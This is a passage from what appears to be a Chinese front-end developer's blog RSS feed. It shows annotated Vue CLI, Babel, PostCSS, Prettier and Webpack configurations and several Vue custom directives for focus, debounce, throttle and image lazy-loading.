      <span>.</span><span>oneOf</span><span>(</span><span>'external'</span><span>)</span>
      <span>.</span><span>use</span><span>(</span><span>'file-loader'</span><span>)</span>
      <span>.</span><span>loader</span><span>(</span><span>'file-loader'</span><span>)</span>
      <span>.</span><span>options</span><span>(</span><span>{</span>
        <span>name</span><span>:</span> <span>'assets/[name].[hash:8].[ext]'</span><span>,</span>
      <span>}</span><span>)</span>

    <span>if</span> <span>(</span>isProd<span>)</span>
      config<span>.</span><span>plugin</span><span>(</span><span>'html'</span><span>)</span><span>.</span><span>tap</span><span>(</span><span>args</span> <span>=></span> <span>(</span><span>(</span>args<span>[</span><span>0</span><span>]</span><span>.</span>cdn <span>=</span> assetsCDN<span>)</span><span>,</span> args<span>)</span><span>)</span>
  <span>}</span><span>,</span>

  <span>css</span><span>:</span> <span>{</span>
    <span>loaderOptions</span><span>:</span> <span>{</span>
      <span>// 设置less共享全局变量</span>
      <span>less</span><span>:</span> <span>{</span>
        <span>globalVars</span><span>:</span> <span>{</span>
          <span>primary</span><span>:</span> <span>'#fff'</span><span>,</span>
        <span>}</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>

  <span>// 开发模式</span>
  <span>devServer</span><span>:</span> <span>{</span>
    <span>disableHostCheck</span><span>:</span> <span>true</span><span>,</span> <span>// 可防止热更新失效</span>
    <span>port</span><span>:</span> <span>7777</span><span>,</span> <span>// 设置服务端口</span>
    <span>proxy</span><span>:</span> <span>{</span>
      <span>// 要代理的请求路径</span>
      <span>'/agency'</span><span>:</span> <span>{</span>
        <span>target</span><span>:</span> <span>'http://www.coderljw.ga:4396'</span><span>,</span> <span>// 要跨域的域名（后端目标接口地址）</span>
        <span>changeOrigin</span><span>:</span> <span>true</span><span>,</span> <span>// 是否开启跨域</span>
        <span>ws</span><span>:</span> <span>false</span><span>,</span> <span>// 不开启websocket代理</span>
        <span>pathRewrite</span><span>:</span> <span>{</span>
          <span>'^/agency'</span><span>:</span> <span>''</span><span>,</span> <span>// 将/agency替换成''</span>
        <span>}</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>

  <span>// 生产模式关闭SourceMap</span>
  <span>productionSourceMap</span><span>:</span> <span>false</span><span>,</span>
  <span>// 开发模式关闭保存eslint代码检测</span>
  <span>lintOnSave</span><span>:</span> <span>false</span><span>,</span>
<span>}</span>

module<span>.</span>exports <span>=</span> vueConfig
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br></div></div><h2 id="_3-babel-config-js"> 3. babel.config.js</h2>
<div><pre><code><span>const</span> productionPlugin <span>=</span> <span>[</span><span>]</span>
<span>if</span> <span>(</span>process<span>.</span>env<span>.</span><span>NODE_ENV</span> <span>===</span> <span>'production'</span><span>)</span>
  productionPlugin<span>.</span><span>push</span><span>(</span><span>'transform-remove-console'</span><span>)</span>

module<span>.</span>exports <span>=</span> <span>{</span>
  <span>presets</span><span>:</span> <span>[</span><span>'@vue/cli-plugin-babel/preset'</span><span>]</span><span>,</span> <span>// 进度条</span>
  <span>plugins</span><span>:</span> <span>[</span>
    <span>[</span>
      <span>'component'</span><span>,</span>
      <span>{</span>
        <span>libraryName</span><span>:</span> <span>'element-ui'</span><span>,</span> <span>// element插件</span>
        <span>styleLibraryName</span><span>:</span> <span>'theme-chalk'</span><span>,</span> <span>// element样式插件</span>
      <span>}</span><span>,</span>
    <span>]</span><span>,</span>
    <span>// 添加插件</span>
    <span>...</span>productionPlugin<span>,</span>
  <span>]</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><h2 id="_4-postcssrc-js"> 4. postcssrc.js</h2>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>plugins</span><span>:</span> <span>{</span>
    <span>// 将px转换为rem，内联样式不可转</span>
    <span>'postcss-pxtorem'</span><span>:</span> <span>{</span>
      <span>// 如果是vant组件，1rem = 37.5px，反之 1rem = 75px (设计稿的十分之一)</span>
      <span>rootValue</span><span>(</span><span><span>{</span> file <span>}</span></span><span>)</span> <span>{</span>
        <span>return</span> file<span>.</span><span>includes</span><span>(</span><span>'vant'</span><span>)</span> <span>?</span> <span>37.5</span> <span>:</span> <span>75</span>
      <span>}</span><span>,</span>
      <span>// 转换所有属性</span>
      <span>propList</span><span>:</span> <span>[</span><span>'*'</span><span>]</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><h2 id="_5-prettierrc"> 5. .prettierrc</h2>
<div><pre><code><span>{</span>
  <span>"printWidth"</span><span>:</span> <span>120</span><span>,</span>
  <span>"tabWidth"</span><span>:</span> <span>2</span><span>,</span>
  <span>"singleQuote"</span><span>:</span> <span>true</span><span>,</span>
  <span>"semi"</span><span>:</span> <span>false</span><span>,</span>
  <span>"arrowParens"</span><span>:</span> <span>"avoid"</span><span>,</span>
  <span>"jsxSingleQuote"</span><span>:</span> <span>true</span><span>,</span>
  <span>"trailingComma"</span><span>:</span> <span>"none"</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Vue</title>
      <link>https://www.matrixtheone.ga/web/note/Vue/</link>
      <guid>https://www.matrixtheone.ga/web/note/Vue/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Vue</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<img :src="$withBase('/images/Movie/黑暗骑士.webp')">
]]></content:encoded>
    </item>
    <item>
      <title>Utils</title>
      <link>https://www.matrixtheone.ga/web/note/Vue/Utils/</link>
      <guid>https://www.matrixtheone.ga/web/note/Vue/Utils/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Utils</source>
      <category>Vue</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-directive"> 1. directive</h2>
<ul>
<li>
<p>directives/index.js，在 main.js 中导入。</p>
<div><pre><code><span>import</span> Vue <span>from</span> <span>'vue'</span>
<span>import</span> <span>*</span> <span>as</span> directives <span>from</span> <span>'./directives'</span>

<span>// 遍历后在全局定义指令</span>
Object<span>.</span><span>keys</span><span>(</span>directives<span>)</span><span>.</span><span>forEach</span><span>(</span><span>item</span> <span>=></span> Vue<span>.</span><span>directive</span><span>(</span>item<span>,</span> directives<span>[</span>item<span>]</span><span>)</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div></li>
<li>
<p>directives/directives.js，指令集合。</p>
<div><pre><code><span>/**
 * @description: 输入框自动聚焦
 */</span>
<span>export</span> <span>const</span> focus <span>=</span> <span>{</span>
  <span>inserted</span><span>:</span> <span>(</span><span>el<span>,</span> binding</span><span>)</span> <span>=></span> el<span>.</span><span>focus</span><span>(</span><span>)</span><span>,</span>
<span>}</span>

<span>/**
 * @description: 防抖指令
 * @param {Array[function, String?, Number?]} 执行函数、监听事件、间隔时间
 */</span>
<span>export</span> <span>const</span> debounce <span>=</span> <span>{</span>
  <span>inserted</span><span>(</span><span>el<span>,</span> binding</span><span>)</span> <span>{</span>
    <span>const</span> <span>[</span>fn<span>,</span> event <span>=</span> <span>'click'</span><span>,</span> time <span>=</span> <span>500</span><span>]</span> <span>=</span> binding<span>.</span>value
    <span>let</span> timer
    el<span>.</span><span>addEventListener</span><span>(</span>event<span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
      timer <span>&amp;&amp;</span> <span>clearTimeout</span><span>(</span>timer<span>)</span>
      timer <span>=</span> <span>setTimeout</span><span>(</span>fn<span>,</span> time<span>)</span>
    <span>}</span><span>)</span>
  <span>}</span><span>,</span>
<span>}</span>

<span>/**
 * @description: 节流指令
 * @param {Array[function, String?, Number?]} 执行函数、监听事件、间隔时间
 */</span>
<span>export</span> <span>const</span> throttle <span>=</span> <span>{</span>
  <span>inserted</span><span>(</span><span>el<span>,</span> binding</span><span>)</span> <span>{</span>
    <span>const</span> <span>[</span>fn<span>,</span> event <span>=</span> <span>'click'</span><span>,</span> time <span>=</span> <span>1000</span><span>]</span> <span>=</span> binding<span>.</span>value
    <span>let</span> preTime <span>=</span> <span>+</span><span>new</span> <span>Date</span><span>(</span><span>)</span>
    el<span>.</span><span>addEventListener</span><span>(</span>event<span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
      <span>const</span> nowTime <span>=</span> <span>+</span><span>new</span> <span>Date</span><span>(</span><span>)</span>
      <span>if</span> <span>(</span>nowTime <span>-</span> preTime <span>></span> time<span>)</span> <span>{</span>
        <span>fn</span><span>(</span><span>)</span>
        preTime <span>=</span> nowTime
      <span>}</span>
    <span>}</span><span>)</span>
  <span>}</span><span>,</span>
<span>}</span>

<span>/**
 * @description: 图片懒加载(性能较差)
 * @param {String} binding.value 图片地址
 */</span>
<span>export</span> <span>const</span> lazy <span>=</span> <span>{</span>
  <span>inserted</span><span>(</span><span>el<span>,</span> binding</span><span>)</span> <span>{</span>
    <span>function</span> <span>fun</span><span>(</span><span>)</span> <span>{</span>
      <span>const</span> <span>H</span> <span>=</span> window<span>.</span>innerHeight
      <span>const</span> st <span>=</span> document<span>.</span>body<span>.</span>scrollTop <span>||</span> document<span>.</span>documentElement<span>.</span>scrollTop
      <span>// 预加载高度200px</span>
      <span>if</span> <span>(</span>el<span>.</span>offsetTop <span>&lt;=</span> <span>H</span> <span>+</span> st <span>+</span> <span>200</span><span>)</span> <span>{</span>
        el<span>.</span>src <span>=</span> binding<span>.</span>value <span>// 图片懒加载</span>
        <span>// el.style.backgroundImage = `url(${binding.value})` // 背景图片懒加载</span>
        window<span>.</span><span>removeEventListener</span><span>(</span><span>'scroll'</span><span>,</span> fun<span>)</span> <span>// 停止监听</span>
      <span>}</span>
    <span>}</span>
    <span>fun</span><span>(</span><span>)</span>
    window<span>.</span><span>addEventListener</span><span>(</span><span>'scroll'</span><span>,</span> fun<span>)</span> <span>// 开启监听</span>
  <span>}</span><span>,</span>
<span>}</span>

<span>/**
 * @description: 图片懒加载(不兼容IE,性能好)
 * @param {String} binding.value 图片地址
 */</span>
<span>export</span> <span>const</span> lazy <span>=</span> <span>{</span>
  <span>inserted</span><span>(</span><span>el<span>,</span> binding</span><span>)</span> <span>{</span>
    <span>const</span> io <span>=</span> <span>new</span> <span>IntersectionObserver</span><span>(</span>
      <span>entries</span> <span>=></span> <span>{</span>
        <span>const</span> en <span>=</span> entries<span>[</span><span>0</span><span>]</span>
        <span>if</span> <span>(</span>en<span>.</span>isIntersecting<span>)</span> <span>{</span>
          en<span>.</span>target<span>.</span>src <span>=</span> binding<span>.</span>value <span>// 图片懒加载</span>
          <span>// en.target.style.backgroundImage = `url(${binding.value})` // 背景图片懒加载</span>
          io<span>.</span><span>unobserve</span><span>(</span>en<span>.</span>target<span>)</span> <span>// 停止监听</span>
        <span>}</span>
      <span>}</span><span>,</span>
      <span>{</span> <span>rootMargin</span><span>:</span> <span>'200px 0px'</span> <span>}</span> <span>// 预加载高度200px</span>
    <span>)</span>
    io<span>.</span><span>observe</span><span>(</span>el<span>)</span> <span>// 开启监听</span>
  <span>}</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br></div></div></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>Webpack</title>
      <link>https://www.matrixtheone.ga/web/note/Webpack/</link>
      <guid>https://www.matrixtheone.ga/web/note/Webpack/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Webpack</source>
      <category>Webpack</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-webpack-配置"> 1. Webpack 配置</h2>
<ul>
<li>
<p>webpack.config.js</p>
<div><pre><code><span>// Node 内置路径模块</span>
<span>const</span> <span>{</span> resolve <span>}</span> <span>=</span> <span>require</span><span>(</span><span>'path'</span><span>)</span>
<span>// 生成 HTML</span>
<span>const</span> HtmlWebpackPlugin <span>=</span> <span>require</span><span>(</span><span>'html-webpack-plugin'</span><span>)</span>
<span>// 提取 CSS 成单独文件</span>
<span>const</span> MiniCssExtractPlugin <span>=</span> <span>require</span><span>(</span><span>'mini-css-extract-plugin'</span><span>)</span>
<span>// 压缩 CSS</span>
<span>const</span> OptimizeCssAssetsWebpackPlugin <span>=</span> <span>require</span><span>(</span><span>'optimize-css-assets-webpack-plugin'</span><span>)</span>

<span>const</span> isProduction <span>=</span> process<span>.</span>env<span>.</span><span>NODE_ENV</span> <span>===</span> <span>'production'</span>

<span>const</span> commonCssLoader <span>=</span> <span>[</span>
  <span>// style-loader 自带 HMR</span>
  isProduction <span>?</span> MiniCssExtractPlugin<span>.</span>loader <span>:</span> <span>'style-loader'</span><span>,</span>
  <span>'css-loader'</span><span>,</span>
  <span>{</span>
    <span>loader</span><span>:</span> <span>'postcss-loader'</span><span>,</span>
    <span>options</span><span>:</span> <span>{</span>
      <span>ident</span><span>:</span> <span>'postcss'</span><span>,</span>
      <span>plugins</span><span>:</span> <span>(</span><span>)</span> <span>=></span> <span>[</span><span>require</span><span>(</span><span>'postcss-preset-env'</span><span>)</span><span>]</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>]</span>

module<span>.</span>exports <span>=</span> <span>{</span>
  <span>// 模式：development（开发）、production（生产）</span>
  <span>mode</span><span>:</span> <span>'production'</span><span>,</span>

  <span>// 入口：要打包的文件</span>
  <span>entry</span><span>:</span> <span>resolve</span><span>(</span>__dirname<span>,</span> <span>'./src/index.js'</span><span>)</span><span>,</span>

  <span>// 出口</span>
  <span>output</span><span>:</span> <span>{</span>
    <span>// 资源引用路径前缀</span>
    <span>publicPath</span><span>:</span> isProduction <span>?</span> <span>'./'</span> <span>:</span> <span>'/'</span><span>,</span>
    <span>// 打包后的文件夹路径</span>
    <span>path</span><span>:</span> <span>resolve</span><span>(</span>__dirname<span>,</span> <span>'build'</span><span>)</span><span>,</span>
    <span>// 打包后文件的名字</span>
    <span>filename</span><span>:</span> <span>'js/[contenthash:10].js'</span><span>,</span>
    <span>// 非入口 chunk 名称（会影响文件命名缓存，可使用 optimization 中 runtimeChunk 配置可解决）</span>
    <span>chunkFilename</span><span>:</span> <span>'js/[name]_chunk.js'</span><span>,</span>
  <span>}</span><span>,</span>

  <span>// 插件</span>
  <span>plugins</span><span>:</span> <span>[</span>
    <span>new</span> <span>HtmlWebpackPlugin</span><span>(</span><span>{</span>
      <span>// 要在内存中生成的文件</span>
      <span>template</span><span>:</span> <span>'./src/index.html'</span><span>,</span>
      <span>// 内存中生成文件的名字</span>
      <span>filename</span><span>:</span> <span>'index.html'</span><span>,</span>
      <span>// 压缩HTML</span>
      <span>minify</span><span>:</span> <span>{</span>
        <span>// 移除空格</span>
        <span>collapseWhitespace</span><span>:</span> <span>true</span><span>,</span>
        <span>// 移除注释</span>
        <span>removeComments</span><span>:</span> <span>true</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>)</span><span>,</span>
    <span>new</span> <span>MiniCssExtractPlugin</span><span>(</span><span>{</span>
      <span>filename</span><span>:</span> <span>'css/built.[contenthash:10].css'</span><span>,</span>
    <span>}</span><span>)</span><span>,</span>
    <span>new</span> <span>OptimizeCssAssetsWebpackPlugin</span><span>(</span><span>)</span><span>,</span>
  <span>]</span><span>,</span>

  <span>// loader规则配置（多个loader倒序使用use）</span>
  <span>module</span><span>:</span> <span>{</span>
    <span>rules</span><span>:</span> <span>[</span>
      <span>// eslint</span>
      <span>{</span>
        <span>test</span><span>:</span> <span><span>/</span><span>\.js$</span><span>/</span></span><span>,</span>
        <span>loader</span><span>:</span> <span>'eslint-loader'</span><span>,</span>
        <span>// 优先执行</span>
        <span>enforce</span><span>:</span> <span>'pre'</span><span>,</span>
        <span>exclude</span><span>:</span> <span><span>/</span><span>node_modules</span><span>/</span></span><span>,</span>
        <span>options</span><span>:</span> <span>{</span>
          <span>// 自动修复</span>
          <span>fix</span><span>:</span> <span>true</span><span>,</span>
        <span>}</span><span>,</span>
      <span>}</span><span>,</span>
      <span>// oneOf：只匹配一个 loader（不能有多个loader处理相同类型文件）</span>
      <span>{</span>
        <span>oneOf</span><span>:</span> <span>[</span>
          <span>// babel</span>
          <span>{</span>
            <span>test</span><span>:</span> <span><span>/</span><span>\.js$</span><span>/</span></span><span>,</span>
            <span>loader</span><span>:</span> <span>'babel-loader'</span><span>,</span>
            <span>exclude</span><span>:</span> <span><span>/</span><span>node_modules</span><span>/</span></span><span>,</span>
            <span>options</span><span>:</span> <span>{</span>
              <span>presets</span><span>:</span> <span>[</span>
                <span>'@babel/preset-env'</span><span>,</span>
                <span>{</span>
                  <span>// 按需加载</span>
                  <span>useBuiltIns</span><span>:</span> <span>'usage'</span><span>,</span>
                  <span>// 指定 core-js 版本</span>
                  <span>corejs</span><span>:</span> <span>{</span>
                    <span>version</span><span>:</span> <span>3</span><span>,</span>
                  <span>}</span><span>,</span>
                  <span>// 指定兼容版本</span>
                  <span>targets</span><span>:</span> <span>{</span>
                    <span>chrome</span><span>:</span> <span>'60'</span><span>,</span>
                    <span>firefox</span><span>:</span> <span>'60'</span><span>,</span>
                    <span>ie</span><span>:</span> <span>'9'</span><span>,</span>
                    <span>safari</span><span>:</span> <span>'10'</span><span>,</span>
                    <span>edge</span><span>:</span> <span>'17'</span><span>,</span>
                  <span>}</span><span>,</span>
                <span>}</span><span>,</span>
              <span>]</span><span>,</span>
              <span>// 开启 babel 缓存</span>
              <span>cacheDirectory</span><span>:</span> <span>true</span><span>,</span>
            <span>}</span><span>,</span>
          <span>}</span><span>,</span>
          <span>// css</span>
          <span>{</span>
            <span>test</span><span>:</span> <span><span>/</span><span>\.css$</span><span>/</span><span>i</span></span><span>,</span>
            <span>use</span><span>:</span> commonCssLoader<span>,</span>
          <span>}</span><span>,</span>
          <span>// less</span>
          <span>{</span>
            <span>test</span><span>:</span> <span><span>/</span><span>\.less$</span><span>/</span><span>i</span></span><span>,</span>
            <span>use</span><span>:</span> <span>[</span><span>...</span>commonCssLoader<span>,</span> <span>'less-loader'</span><span>]</span><span>,</span>
          <span>}</span><span>,</span>
          <span>// sass、scss</span>
          <span>{</span>
            <span>test</span><span>:</span> <span><span>/</span><span>\.s[ac]ss$</span><span>/</span><span>i</span></span><span>,</span>
            <span>use</span><span>:</span> <span>[</span><span>...</span>commonCssLoader<span>,</span> <span>'sass-loader'</span><span>]</span><span>,</span>
          <span>}</span><span>,</span>
          <span>// 图片</span>
          <span>{</span>
            <span>test</span><span>:</span> <span><span>/</span><span>\.(png|jpe?g|gif)$</span><span>/</span><span>i</span></span><span>,</span>
            <span>loader</span><span>:</span> <span>'url-loader'</span><span>,</span>
            <span>options</span><span>:</span> <span>{</span>
              <span>// 图片小于 limit，打包成 base64 格式，大于 limit 生成 hash 名称的图片</span>
              <span>limit</span><span>:</span> <span>10</span> <span>*</span> <span>1024</span><span>,</span>
              <span>// 10 位 hash 名称图片</span>
              <span>name</span><span>:</span> <span>'[hash:10].[ext]'</span><span>,</span>
              <span>// 输出路径</span>
              <span>outputPath</span><span>:</span> <span>'assets'</span><span>,</span>
              <span>// true：ESM、false：CJS、默认为 true</span>
              <span>esModule</span><span>:</span> <span>false</span><span>,</span>
            <span>}</span><span>,</span>
          <span>}</span><span>,</span>
          <span>// html图片</span>
          <span>{</span>
            <span>test</span><span>:</span> <span><span>/</span><span>\.html$</span><span>/</span><span>i</span></span><span>,</span>
            <span>loader</span><span>:</span> <span>'html-loader'</span><span>,</span>
          <span>}</span><span>,</span>
          <span>// 其他资源</span>
          <span>{</span>
            <span>// 排除 html|css|js|less|sass|jpe?g|png|gif 资源</span>
            <span>exclude</span><span>:</span> <span><span>/</span><span>\.(html|css|js|less|sass|jpe?g|png|gif)$</span><span>/</span><span>i</span></span><span>,</span>
            <span>loader</span><span>:</span> <span>'file-loader'</span><span>,</span>
            <span>options</span><span>:</span> <span>{</span>
              <span>name</span><span>:</span> <span>'[hash:10].[ext]'</span><span>,</span>
              <span>// 输出路径</span>
              <span>outputPath</span><span>:</span> <span>'media'</span><span>,</span>
            <span>}</span><span>,</span>
          <span>}</span><span>,</span>
        <span>]</span><span>,</span>
      <span>}</span><span>,</span>
    <span>]</span><span>,</span>
  <span>}</span><span>,</span>

  <span>// 开发配置</span>
  <span>devServer</span><span>:</span> <span>{</span>
    <span>// 启动路径（打包出口路径）</span>
    <span>contentBase</span><span>:</span> <span>resolve</span><span>(</span>_dirname<span>,</span> <span>'build'</span><span>)</span><span>,</span>
    <span>// 开启 HMR</span>
    <span>hot</span><span>:</span> <span>true</span><span>,</span>
    <span>// 启动 gzip 压缩</span>
    <span>compress</span><span>:</span> <span>true</span><span>,</span>
    <span>// 服务器外部可访问</span>
    <span>host</span><span>:</span> <span>'0.0.0.0'</span><span>,</span>
    <span>// 启动端口</span>
    <span>port</span><span>:</span> <span>7777</span><span>,</span>
    <span>// 自动打开浏览器</span>
    <span>open</span><span>:</span> <span>true</span><span>,</span>
    <span>// 指定打开页面</span>
    <span>openPage</span><span>:</span> <span>'/home'</span><span>,</span>
    <span>// 可防止热更新失效</span>
    <span>disableHostCheck</span><span>:</span> <span>true</span><span>,</span>
    <span>// 不显示启动日志</span>
    <span>clientLogLevel</span><span>:</span> <span>'none'</span><span>,</span>
    <span>// 除了基本启动信息，其余都不显示</span>
    <span>quiet</span><span>:</span> <span>true</span><span>,</span>
    <span>// 不全屏提示错误</span>
    <span>overlay</span><span>:</span> <span>false</span><span>,</span>
    <span>// 代理</span>
    <span>proxy</span><span>:</span> <span>{</span>
      <span>// 要代理的请求路径</span>
      <span>'/agency'</span><span>:</span> <span>{</span>
        <span>// 要跨域的域名（后端接口地址）</span>
        <span>target</span><span>:</span> <span>'http://www.coderljw.ga:4396'</span><span>,</span>
        <span>// 是否开启跨域</span>
        <span>changeOrigin</span><span>:</span> <span>true</span><span>,</span>
        <span>// 将 /agency 替换成 ''（删除 /agency）</span>
        <span>pathRewrite</span><span>:</span> <span>{</span>
          <span>'^/agency'</span><span>:</span> <span>''</span><span>,</span>
        <span>}</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>

  <span>// 解析模块规则</span>
  <span>resolve</span><span>:</span> <span>{</span>
    <span>// 别名</span>
    <span>alias</span><span>:</span> <span>{</span>
      <span>'@'</span><span>:</span> <span>resolve</span><span>(</span>__dirname<span>,</span> <span>'src'</span><span>)</span><span>,</span>
    <span>}</span><span>,</span>
    <span>// 省略后缀</span>
    <span>extensions</span><span>:</span> <span>[</span><span>'.js'</span><span>,</span> <span>'json'</span><span>,</span> <span>'jsx'</span><span>]</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br><span>114</span><br><span>115</span><br><span>116</span><br><span>117</span><br><span>118</span><br><span>119</span><br><span>120</span><br><span>121</span><br><span>122</span><br><span>123</span><br><span>124</span><br><span>125</span><br><span>126</span><br><span>127</span><br><span>128</span><br><span>129</span><br><span>130</span><br><span>131</span><br><span>132</span><br><span>133</span><br><span>134</span><br><span>135</span><br><span>136</span><br><span>137</span><br><span>138</span><br><span>139</span><br><span>140</span><br><span>141</span><br><span>142</span><br><span>143</span><br><span>144</span><br><span>145</span><br><span>146</span><br><span>147</span><br><span>148</span><br><span>149</span><br><span>150</span><br><span>151</span><br><span>152</span><br><span>153</span><br><span>154</span><br><span>155</span><br><span>156</span><br><span>157</span><br><span>158</span><br><span>159</span><br><span>160</span><br><span>161</span><br><span>162</span><br><span>163</span><br><span>164</span><br><span>165</span><br><span>166</span><br><span>167</span><br><span>168</span><br><span>169</span><br><span>170</span><br><span>171</span><br><span>172</span><br><span>173</span><br><span>174</span><br><span>175</span><br><span>176</span><br><span>177</span><br><span>178</span><br><span>179</span><br><span>180</span><br><span>181</span><br><span>182</span><br><span>183</span><br><span>184</span><br><span>185</span><br><span>186</span><br><span>187</span><br><span>188</span><br><span>189</span><br><span>190</span><br><span>191</span><br><span>192</span><br><span>193</span><br><span>194</span><br><span>195</span><br><span>196</span><br><span>197</span><br><span>198</span><br><span>199</span><br><span>200</span><br><span>201</span><br><span>202</span><br><span>203</span><br><span>204</span><br><span>205</span><br><span>206</span><br><span>207</span><br><span>208</span><br><span>209</span><br><span>210</spa